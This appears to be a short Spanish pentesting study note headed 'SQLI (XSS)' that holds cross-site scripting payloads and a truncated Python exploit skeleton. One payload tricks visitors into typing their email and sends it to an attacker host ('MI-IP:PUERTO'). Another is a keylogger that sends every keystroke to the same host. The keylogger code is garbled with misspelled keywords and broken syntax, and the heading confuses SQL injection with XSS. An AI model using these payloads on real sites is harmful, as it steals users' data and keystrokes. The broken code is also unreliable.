![[Pasted image 20240208124843.png]]


![[Pasted image 20240208125612.png]]


![[Pasted image 20240208125442.png]]


### SQLI (XSS)

xss
```python
<script>alert("XSS")</script>
```
xss
```python
<script>
var email= prompt("introduce tu correo");

if (email==null || email == ""){
	alert("Es necesario introducir un correo valido para visualizar el post"); 
} else {
	fetch("http://MI-IP:PUERTO/?email=" + email);
}
</script>
```

xss keylogger
```python
<script>
	var k = "";
	document.onkeypress = funtion(e){
	e = e weindow.event;
	k += e.key
	var i = new Imagen();
	i.src = "http://MI-IP:PUERTO/" + k;
	}
</script>
```

```python
 #!/usr/bin/python3
import requests
import signal
import sys
import time
import string
from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit
```